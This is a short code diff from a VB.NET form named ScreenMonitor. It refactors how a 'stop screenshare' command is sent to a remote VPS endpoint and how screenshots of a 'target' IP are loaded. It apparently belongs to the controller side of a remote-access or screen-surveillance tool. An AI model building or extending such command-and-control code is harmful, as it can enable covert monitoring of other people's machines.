@@ -20,6 +20,7 @@ Public Class ScreenMonitor
     End Sub
     Private Sub ScreenMonitor_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
         If transmissionThread IsNot Nothing Then transmissionThread.Abort()
+        StopScreenshare()
     End Sub
 
     Private Function StringQualityToLong(quality As String) As Long
@@ -34,6 +35,10 @@ Public Class ScreenMonitor
         End If
     End Function
 
+    Private Sub StopScreenshare()
+        Dim client = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=stop")
+    End Sub
+
     Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
         transmissionThread = New Thread(Sub() doTransmission(500 / Convert.ToInt32(FPS.SelectedItem)))
         transmissionThread.Start()
@@ -43,7 +48,7 @@ Public Class ScreenMonitor
         screenshotBTN.Enabled = False
     End Sub
     Private Sub StopButton_Click(sender As Object, e As EventArgs) Handles StopButton.Click
-        Dim client = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=stop")
+        StopScreenshare()
         transmissionThread.Abort()
         Render.Image = Nothing
         StopButton.Enabled = False
@@ -122,7 +127,7 @@ Public Class ScreenMonitor
 
 displayimage:
         Try
-            Threading.Thread.Sleep(100)
+            Thread.Sleep(100)
             Render.Load(My.Settings.vpsurl & "logs/" & targetIp & "/screenshots/" & sb.ToString & ".jpeg")
         Catch ex As Exception
             GoTo displayimage
